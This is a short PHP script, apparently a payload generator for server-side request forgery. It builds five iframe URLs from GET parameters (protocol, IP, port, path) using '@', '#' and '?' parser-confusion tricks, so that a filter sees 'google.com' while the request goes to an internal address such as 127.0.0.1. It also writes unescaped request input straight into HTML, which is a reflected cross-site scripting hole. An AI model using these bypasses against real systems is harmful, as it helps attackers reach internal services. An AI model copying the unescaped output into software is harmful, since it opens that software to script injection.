<?php
#http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/
header("Content-Type: text/html");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");

echo '<html><body>';
echo '<iframe src="'.$_GET["proto"].'://google.com:80+&@'.$_GET["ip"].':'.$_GET["port"].$_GET["url"].'#+@google.com:80/" height="180px" width="80%"></iframe>';
echo '<iframe src="'.$_GET["proto"].'://'.$_GET["ip"].':'.$_GET["port"].$_GET["url"].'+&@google.com:80#+@google.com:80/" height="180px" width="80%"></iframe>';
echo '<iframe src="'.$_GET["proto"].'://google.com:80+&@google.com:80#+@'.$_GET["ip"].':'.$_GET["port"].$_GET["url"].'" height="180px" width="80%"></iframe>';
echo '<iframe src="'.$_GET["proto"].'://'.$_GET["ip"].':'.$_GET["port"].$_GET["url"].'?@google.com:80/" height="180px" width="80%"></iframe>';
echo '<iframe src="'.$_GET["proto"].'://'.$_GET["ip"].':'.$_GET["port"].$_GET["url"].'#@www.google.com:80/" height="180px" width="80%"></iframe>';
echo '</body></html>';
